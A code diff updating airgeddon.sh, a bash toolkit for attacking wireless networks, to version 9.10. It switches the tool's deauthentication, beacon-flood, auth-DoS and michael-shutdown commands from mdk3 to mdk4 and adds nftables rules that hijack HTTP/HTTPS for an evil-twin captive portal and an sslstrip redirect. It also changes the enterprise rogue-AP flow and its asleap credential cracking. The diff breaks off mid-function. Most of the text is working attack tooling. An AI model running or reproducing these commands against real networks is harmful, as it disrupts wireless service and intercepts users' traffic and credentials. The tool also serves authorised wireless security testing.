@@ -2,8 +2,8 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20190131
-#Version......: 9.01
+#Date.........: 20190317
+#Version......: 9.10
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -41,11 +41,11 @@ optional_tools_names=(
 						"wpaclean"
 						"crunch"
 						"aireplay-ng"
-						"mdk3"
+						"mdk4"
 						"hashcat"
 						"hostapd"
 						"dhcpd"
-						"iptables"
+						"nft"
 						"ettercap"
 						"etterlog"
 						"sslstrip"
@@ -79,11 +79,11 @@ declare -A possible_package_names=(
 									[${optional_tools_names[0]}]="aircrack-ng" #wpaclean
 									[${optional_tools_names[1]}]="crunch" #crunch
 									[${optional_tools_names[2]}]="aircrack-ng" #aireplay-ng
-									[${optional_tools_names[3]}]="mdk3" #mdk3
+									[${optional_tools_names[3]}]="mdk4" #mdk4
 									[${optional_tools_names[4]}]="hashcat" #hashcat
 									[${optional_tools_names[5]}]="hostapd" #hostapd
 									[${optional_tools_names[6]}]="isc-dhcp-server / dhcp-server / dhcp" #dhcpd
-									[${optional_tools_names[7]}]="iptables" #iptables
+									[${optional_tools_names[7]}]="nftables" #nft
 									[${optional_tools_names[8]}]="ettercap / ettercap-text-only / ettercap-graphical" #ettercap
 									[${optional_tools_names[9]}]="ettercap / ettercap-text-only / ettercap-graphical" #etterlog
 									[${optional_tools_names[10]}]="sslstrip" #sslstrip
@@ -106,11 +106,12 @@ declare -A possible_package_names=(
 #More than one alias can be defined separated by spaces at value
 declare -A possible_alias_names=(
 									["beef"]="beef-xss beef-server"
+									["nft"]="iptables"
 								)
 
 #General vars
-airgeddon_version="9.01"
-language_strings_expected_version="9.01-1"
+airgeddon_version="9.10"
+language_strings_expected_version="9.10-1"
 standardhandshake_filename="handshake-01.cap"
 timeout_capture_handshake="20"
 tmpdir="/tmp/"
@@ -208,6 +209,9 @@ alt_range_start="172.16.250.33"
 alt_range_stop="172.16.250.100"
 std_c_mask="255.255.255.0"
 ip_mask="255.255.255.255"
+std_c_mask_cidr="24"
+ip_mask_cidr="32"
+routing_tmp_file="ag.iptables_nftables"
 dhcpd_file="ag.dhcpd.conf"
 internet_dns1="8.8.8.8"
 internet_dns2="8.8.4.4"
@@ -3336,11 +3340,11 @@ function launch_dos_pursuit_mode_attack() {
 
 	recalculate_windows_sizes
 	case "${1}" in
-		"mdk3 amok attack")
+		"mdk4 amok attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
 		;;
 		"aireplay deauth attack")
 			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
@@ -3353,31 +3357,31 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=10
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
 		;;
 		"beacon flood attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1 &
 		;;
 		"auth dos attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1 &
 		;;
 		"michael shutdown attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1 &
 		;;
-		"Mdk3")
+		"Mdk4")
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk3 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" > /dev/null 2>&1 &
 		;;
 		"Aireplay")
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
@@ -3390,7 +3394,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk3 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" > /dev/null 2>&1 &
 		;;
 	esac
 
@@ -3483,8 +3487,8 @@ pid_control_pursuit_mode() {
 	kill_dos_pursuit_mode_processes
 }
 
-#Execute mdk3 deauth DoS attack
-function exec_mdk3deauth() {
+#Execute mdk4 deauth DoS attack
+function exec_mdk4deauth() {
 
 	debug_print
 
@@ -3502,13 +3506,13 @@ function exec_mdk3deauth() {
 		language_strings "${language}" 4 "read"
 
 		dos_pursuit_mode_pids=()
-		launch_dos_pursuit_mode_attack "mdk3 amok attack" "first_time"
-		pid_control_pursuit_mode "mdk3 amok attack"
+		launch_dos_pursuit_mode_attack "mdk4 amok attack" "first_time"
+		pid_control_pursuit_mode "mdk4 amok attack"
 	else
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
+		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk4 amok attack" -e mdk4 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
 	fi
 }
 
@@ -3564,7 +3568,7 @@ function exec_wdsconfusion() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
+		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk4 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
 	fi
 }
 
@@ -3591,7 +3595,7 @@ function exec_beaconflood() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "beacon flood attack" -e mdk3 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1
+		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "beacon flood attack" -e mdk4 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1
 	fi
 }
 
@@ -3618,7 +3622,7 @@ function exec_authdos() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "auth dos attack" -e mdk3 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1
+		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "auth dos attack" -e mdk4 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1
 	fi
 }
 
@@ -3645,12 +3649,12 @@ function exec_michaelshutdown() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
+		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk4 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
 	fi
 }
 
-#Validate Mdk3 parameters
-function mdk3_deauth_option() {
+#Validate Mdk4 parameters
+function mdk4_deauth_option() {
 
 	debug_print
 
@@ -3681,7 +3685,7 @@ function mdk3_deauth_option() {
 		dos_pursuit_mode=1
 	fi
 
-	exec_mdk3deauth
+	exec_mdk4deauth
 }
 
 #Validate Aireplay parameters
@@ -4254,7 +4258,7 @@ function initialize_menu_options_dependencies() {
 	clean_handshake_dependencies=(${optional_tools_names[0]})
 	aircrack_attacks_dependencies=(${optional_tools_names[1]})
 	aireplay_attack_dependencies=(${optional_tools_names[2]})
-	mdk3_attack_dependencies=(${optional_tools_names[3]})
+	mdk4_attack_dependencies=(${optional_tools_names[3]})
 	hashcat_attacks_dependencies=(${optional_tools_names[4]})
 	et_onlyap_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]})
 	et_sniffing_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]})
@@ -4410,7 +4414,7 @@ function clean_env_vars() {
 
 	debug_print
 
-	unset AIRGEDDON_AUTO_UPDATE AIRGEDDON_SKIP_INTRO AIRGEDDON_BASIC_COLORS AIRGEDDON_EXTENDED_COLORS AIRGEDDON_AUTO_CHANGE_LANGUAGE AIRGEDDON_SILENT_CHECKS AIRGEDDON_PRINT_HINTS AIRGEDDON_5GHZ_ENABLED AIRGEDDON_DEVELOPMENT_MODE AIRGEDDON_DEBUG_MODE
+	unset AIRGEDDON_AUTO_UPDATE AIRGEDDON_SKIP_INTRO AIRGEDDON_BASIC_COLORS AIRGEDDON_EXTENDED_COLORS AIRGEDDON_AUTO_CHANGE_LANGUAGE AIRGEDDON_SILENT_CHECKS AIRGEDDON_PRINT_HINTS AIRGEDDON_5GHZ_ENABLED AIRGEDDON_FORCE_IPTABLES AIRGEDDON_DEVELOPMENT_MODE AIRGEDDON_DEBUG_MODE
 }
 
 #Clean temporary files
@@ -4467,42 +4471,78 @@ function clean_routing_rules() {
 		echo "${original_routing_state}" > /proc/sys/net/ipv4/ip_forward
 	fi
 
+	clean_initialize_iptables_nftables
+
 	if [ "${iptables_saved}" -eq 1 ]; then
-		restore_iptables
+		restore_iptables_nftables
+	fi
+
+	rm -rf "${tmpdir}${routing_tmp_file}" > /dev/null 2>&1
+}
+
+#Save iptables/nftables rules
+function save_iptables_nftables() {
+
+	debug_print
+
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		if hash "iptables-${iptables_cmd}-save" 2> /dev/null; then
+			if "iptables-${iptables_cmd}-save" > "${tmpdir}${routing_tmp_file}" 2> /dev/null; then
+				iptables_saved=1
+			fi
+		elif hash "${iptables_cmd}-compat-save" 2> /dev/null; then
+			if "${iptables_cmd}-compat-save" > "${tmpdir}${routing_tmp_file}" 2> /dev/null; then
+				iptables_saved=1
+			fi
+		fi
 	else
-		clean_iptables
-	fi
-
-	rm -rf "${tmpdir}ag.iptables" > /dev/null 2>&1
-}
-
-#Save iptables rules
-function save_iptables() {
-
-	debug_print
-
-	if "${iptables_cmd}-save" > "${tmpdir}ag.iptables" 2> /dev/null; then
-		iptables_saved=1
+		if hash "${iptables_cmd}-save" 2> /dev/null; then
+			if "${iptables_cmd}-save" > "${tmpdir}${routing_tmp_file}" 2> /dev/null; then
+				iptables_saved=1
+			fi
+		fi
 	fi
 }
 
-#Restore iptables rules
-function restore_iptables() {
+#Restore iptables/nftables rules
+function restore_iptables_nftables() {
 
 	debug_print
 
-	"${iptables_cmd}-restore" < "${tmpdir}ag.iptables" 2> /dev/null
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		if hash "iptables-${iptables_cmd}-restore" 2> /dev/null; then
+			"iptables-${iptables_cmd}-restore" < "${tmpdir}${routing_tmp_file}" 2> /dev/null
+		elif hash "${iptables_cmd}-compat-restore" 2> /dev/null; then
+			"${iptables_cmd}-compat-restore" < "${tmpdir}${routing_tmp_file}" 2> /dev/null
+		fi
+	else
+		if hash "${iptables_cmd}-restore" 2> /dev/null; then
+			"${iptables_cmd}-restore" < "${tmpdir}${routing_tmp_file}" 2> /dev/null
+		fi
+	fi
 }
 
-#Clean iptables rules
-function clean_iptables() {
+#Clean and initialize iptables/nftables rules
+function clean_initialize_iptables_nftables() {
 
 	debug_print
 
-	"${iptables_cmd}" -F
-	"${iptables_cmd}" -t nat -F
-	"${iptables_cmd}" -X
-	"${iptables_cmd}" -t nat -X
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		"${iptables_cmd}" add table ip filter 2> /dev/null
+		"${iptables_cmd}" add chain ip filter INPUT 2> /dev/null
+		"${iptables_cmd}" add chain ip filter OUTPUT 2> /dev/null
+		"${iptables_cmd}" add chain ip filter FORWARD 2> /dev/null
+		"${iptables_cmd}" flush table ip filter 2> /dev/null
+		"${iptables_cmd}" add table ip nat 2> /dev/null
+		"${iptables_cmd}" add chain nat PREROUTING "{ type nat hook prerouting priority 0 ; }" 2> /dev/null
+		"${iptables_cmd}" add chain nat POSTROUTING "{ type nat hook postrouting priority 100 ; }" 2> /dev/null
+		"${iptables_cmd}" flush table ip nat 2> /dev/null
+	else
+		"${iptables_cmd}" -F 2> /dev/null
+		"${iptables_cmd}" -t nat -F 2> /dev/null
+		"${iptables_cmd}" -X 2> /dev/null
+		"${iptables_cmd}" -t nat -X 2> /dev/null
+	fi
 }
 
 #Create an array from parameters
@@ -7215,7 +7255,7 @@ function exec_hashcat_rulebased_attack() {
 	language_strings "${language}" 115 "read"
 }
 
-#Execute Enterprise smooth attack
+#Execute Enterprise smooth/noisy attack
 function exec_enterprise_attack() {
 
 	debug_print
@@ -7235,7 +7275,19 @@ function exec_enterprise_attack() {
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
-	restore_et_interface
+	if [ ${enterprise_mode} = "noisy" ]; then
+		restore_et_interface
+	else
+		if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
+			interface=$(grep -E "^interface=" "${tmpdir}${enterprisedir}returning_vars.txt" | awk -F "=" '{print $2}')
+			phy_interface=$(grep -E "^phy_interface=" "${tmpdir}${enterprisedir}returning_vars.txt" | awk -F "=" '{print $2}')
+			current_iface_on_messages=$(grep -E "^current_iface_on_messages=" "${tmpdir}${enterprisedir}returning_vars.txt" | awk -F "=" '{print $2}')
+			ifacemode=$(grep -E "^ifacemode=" "${tmpdir}${enterprisedir}returning_vars.txt" | awk -F "=" '{print $2}')
+			rm -rf "${tmpdir}${enterprisedir}returning_vars.txt" > /dev/null 2>&1
+		else
+			restore_et_interface
+		fi
+	fi
 	handle_enterprise_log
 	handle_asleap_attack
 	clean_tmpfiles
@@ -7247,30 +7299,34 @@ function handle_asleap_attack() {
 	debug_print
 
 	if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
-		ask_yesno 537 "no"
-		if [ "${yesno}" = "y" ]; then
+		local result
+		result=$(cat "${tmpdir}${enterprisedir}${enterprise_successfile}")
+		if [[ ${result} -eq 0 ]] || [[ ${result} -eq 2 ]]; then
+			ask_yesno 537 "no"
+			if [ "${yesno}" = "y" ]; then
 
-			asleap_attack_finished=0
+				asleap_attack_finished=0
 
-			if [ ${enterprise_mode} = "noisy" ]; then
-				if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
-					echo
-					language_strings "${language}" 542 "yellow"
-				else
-					select_captured_enterprise_user
+				if [ ${enterprise_mode} = "noisy" ]; then
+					if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
+						echo
+						language_strings "${language}" 542 "yellow"
+					else
+						select_captured_enterprise_user
+					fi
 				fi
+
+				echo
+				language_strings "${language}" 538 "blue"
+
+				while [[ "${asleap_attack_finished}" != "1" ]]; do
+					ask_dictionary
+					echo
+					exec_asleap_attack
+					echo
+					manage_asleap_pot
+				done
 			fi
-
-			echo
-			language_strings "${language}" 538 "blue"
-
-			while [[ "${asleap_attack_finished}" != "1" ]]; do
-				ask_dictionary
-				echo
-				exec_asleap_attack
-				echo
-				manage_asleap_pot
-			done
 		fi
 	fi
 }
@@ -7492,8 +7548,10 @@ function set_hostapd_config() {
 	tmpfiles_toclean=1
 	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
 
-	different_mac_digit=$(xxd -p -u -l 100 < /dev/urandom  | sed "s/${bssid:10:1}//g" | head -c 1)
-	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}
+	local digit_to_change
+	digit_to_change="${bssid:10:1}"
+	(( different_mac_digit=("16#${digit_to_change}" + 1 + RANDOM % 15) % 16 ))
+	et_bssid=$(printf %s%X%s\\n "${bssid::10}" "${different_mac_digit}" "${bssid:11}")
 
 	{
 	echo -e "interface=${interface}"
@@ -7570,9 +7628,9 @@ function launch_fake_ap() {
 	debug_print
 
 	if [ -n "${enterprise_mode}" ]; then
-		kill "$(ps -C hostapd-wpe --no-headers -o pid)" &> /dev/null
+		kill "$(ps -C hostapd-wpe --no-headers -o pid | tr -d ' ')" &> /dev/null
 	else
-		kill "$(ps -C hostapd --no-headers -o pid)" &> /dev/null
+		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
 	fi
 	${airmon} check kill > /dev/null 2>&1
 	nm_processes_killed=1
@@ -7734,46 +7792,86 @@ function set_std_internet_routing_rules() {
 
 	if [ "${routing_modified}" -eq 0 ]; then
 		original_routing_state=$(cat /proc/sys/net/ipv4/ip_forward)
-		save_iptables
+		save_iptables_nftables
 	fi
 
 	ifconfig "${interface}" ${et_ip_router} netmask ${std_c_mask} > /dev/null 2>&1
 	routing_modified=1
 
-	clean_iptables
+	clean_initialize_iptables_nftables
 
 	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
-		"${iptables_cmd}" -P FORWARD ACCEPT
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip filter FORWARD counter accept
+		else
+			"${iptables_cmd}" -P FORWARD ACCEPT
+		fi
 		echo "1" > /proc/sys/net/ipv4/ip_forward
 	else
-		"${iptables_cmd}" -P FORWARD DROP
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip filter FORWARD counter drop
+		else
+			"${iptables_cmd}" -P FORWARD DROP
+		fi
 		echo "0" > /proc/sys/net/ipv4/ip_forward
 	fi
 
 	if [ "${et_mode}" = "et_captive_portal" ]; then
-		"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ${et_ip_router}:80
-		"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination ${et_ip_router}:80
-		"${iptables_cmd}" -A INPUT -p tcp --destination-port 80 -j ACCEPT
-		"${iptables_cmd}" -A INPUT -p tcp --destination-port 443 -j ACCEPT
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip nat PREROUTING tcp dport 80 counter dnat to ${et_ip_router}:80
+			"${iptables_cmd}" add rule ip nat PREROUTING tcp dport 443 counter dnat to ${et_ip_router}:443
+			"${iptables_cmd}" add rule ip filter INPUT tcp dport 80 counter accept
+			"${iptables_cmd}" add rule ip filter INPUT tcp dport 443 counter accept
+		else
+			"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ${et_ip_router}:80
+			"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination ${et_ip_router}:80
+			"${iptables_cmd}" -A INPUT -p tcp --destination-port 80 -j ACCEPT
+			"${iptables_cmd}" -A INPUT -p tcp --destination-port 443 -j ACCEPT
+		fi
 		if [ ${captive_portal_mode} = "dnsblackhole" ]; then
-			"${iptables_cmd}" -A INPUT -p udp --destination-port 53 -j ACCEPT
+			if [ "${iptables_nftables}" -eq 1 ]; then
+				"${iptables_cmd}" add rule ip filter INPUT udp dport 53 counter accept
+			else
+				"${iptables_cmd}" -A INPUT -p udp --destination-port 53 -j ACCEPT
+			fi
 		fi
 	elif [ "${et_mode}" = "et_sniffing_sslstrip" ]; then
-		"${iptables_cmd}" -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port ${sslstrip_port}
-		"${iptables_cmd}" -A INPUT -p tcp --destination-port ${sslstrip_port} -j ACCEPT
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip nat PREROUTING tcp dport 80 counter redirect to :${sslstrip_port}
+			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${sslstrip_port} counter accept
+		else
+			"${iptables_cmd}" -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port ${sslstrip_port}
+			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${sslstrip_port} -j ACCEPT
+		fi
 	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
-		"${iptables_cmd}" -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
-		"${iptables_cmd}" -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
-		"${iptables_cmd}" -A INPUT -i lo -j ACCEPT
-		"${iptables_cmd}" -A INPUT -p tcp --destination-port ${beef_port} -j ACCEPT
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${bettercap_proxy_port} counter accept
+			"${iptables_cmd}" add rule ip filter INPUT udp dport ${bettercap_dns_port} counter accept
+			"${iptables_cmd}" add rule ip filter INPUT iifname "lo" counter accept
+			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${beef_port} counter accept
+		else
+			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
+			"${iptables_cmd}" -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
+			"${iptables_cmd}" -A INPUT -i lo -j ACCEPT
+			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${beef_port} -j ACCEPT
+		fi
 	fi
 
 	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
-		"${iptables_cmd}" -t nat -A POSTROUTING -o "${internet_interface}" -j MASQUERADE
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule nat POSTROUTING ip saddr ${et_ip_range}/${std_c_mask_cidr} oifname "${internet_interface}" counter masquerade
+		else
+			"${iptables_cmd}" -t nat -A POSTROUTING -o "${internet_interface}" -j MASQUERADE
+		fi
 	fi
 
-	"${iptables_cmd}" -A INPUT -p icmp --icmp-type 8 -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
-	"${iptables_cmd}" -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		"${iptables_cmd}" add rule ip filter INPUT ip saddr ${et_ip_range}/${std_c_mask_cidr} ip daddr ${et_ip_router}/${ip_mask_cidr} icmp type echo-request ct state new,related,established counter accept
+		"${iptables_cmd}" add rule ip filter INPUT ip saddr ${et_ip_range}/${std_c_mask_cidr} ip daddr ${et_ip_router}/${ip_mask_cidr} counter drop
+	else
+		"${iptables_cmd}" -A INPUT -p icmp --icmp-type 8 -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
+		"${iptables_cmd}" -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
+	fi
 	sleep 2
 }
 
@@ -7782,7 +7880,7 @@ function launch_dhcp_server() {
 
 	debug_print
 
-	kill "$(ps -C dhcpd --no-headers -o pid)" &> /dev/null
+	kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
 
 	recalculate_windows_sizes
 	case ${et_mode} in
@@ -7809,19 +7907,19 @@ function exec_et_deauth() {
 	prepare_et_monitor
 
 	case ${et_dos_attack} in
-		"Mdk3")
-			kill "$(ps -C mdk3 --no-headers -o pid)" &> /dev/null
+		"Mdk4")
+			kill "$(ps -C mdk4 --no-headers -o pid | tr -d ' ')" &> /dev/null
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
-			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+			deauth_et_cmd="mdk4 ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
 		;;
 		"Aireplay")
-			kill "$(ps -C aireplay-ng --no-headers -o pid)" &> /dev/null
+			kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
 			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
 		;;
 		"Wds Confusion")
-			kill "$(ps -C mdk3 --no-headers -o pid)" &> /dev/null
-			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
+			kill "$(ps -C mdk4 --no-headers -o pid | tr -d ' ')" &> /dev/null
+			deauth_et_cmd="mdk4 ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
 		;;
 	esac
 
@@ -8277,6 +8375,12 @@ function set_enterprise_control_script() {
 
 	cat >&7 <<-EOF
 		#!/usr/bin/env bash
+		interface="${interface}"
+		et_initial_state="${et_initial_state}"
+		interface_airmon_compatible=${interface_airmon_compatible}
+		iface_monitor_et_deauth="${iface_monitor_et_deauth}"
+		airmon="${airmon}"
+		enterprise_returning_vars_file="${tmpdir}${enterprisedir}returning_vars.txt"
 		enterprise_heredoc_mode="${enterprise_mode}"
 		path_to_processes="${tmpdir}${enterprisedir}${enterprise_processesfile}"
 		wpe_logfile="${tmpdir}${hostapd_wpe_log}"
@@ -8286,6 +8390,49 @@ function set_enterprise_control_script() {
 	EOF
 
 	cat >&7 <<-'EOF'
+		#Restore interface to its original state
+		function restore_interface() {
+
+			if hash rfkill 2> /dev/null; then
+				rfkill unblock all > /dev/null 2>&1
+			fi
+
+			iw dev "${iface_monitor_et_deauth}" del > /dev/null 2>&1
+
+			if [ "${et_initial_state}" = "Managed" ]; then
+				ifconfig "${interface}" down > /dev/null 2>&1
+				iwconfig "${interface}" mode "managed" > /dev/null 2>&1
+				ifconfig "${interface}" up > /dev/null 2>&1
+				ifacemode="Managed"
+			else
+				if [ "${interface_airmon_compatible}" -eq 1 ]; then
+					new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
+
+					[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+					if [ "${interface}" != "${new_interface}" ]; then
+						interface=${new_interface}
+						phy_interface=$(basename "$(readlink "/sys/class/net/${interface}/phy80211")" 2> /dev/null)
+						current_iface_on_messages="${interface}"
+					fi
+				else
+					ifconfig "${interface}" down > /dev/null 2>&1
+					iwconfig "${interface}" mode "monitor" > /dev/null 2>&1
+					ifconfig "${interface}" up > /dev/null 2>&1
+				fi
+				ifacemode="Monitor"
+			fi
+		}
+
+		#Save some vars to a file to get read from main script
+		function save_returning_vars_to_file() {
+			{
+			echo -e "interface=${interface}"
+			echo -e "phy_interface=${phy_interface}"
+			echo -e "current_iface_on_messages=${current_iface_on_messages}"
+			echo -e "ifacemode=${ifacemode}"
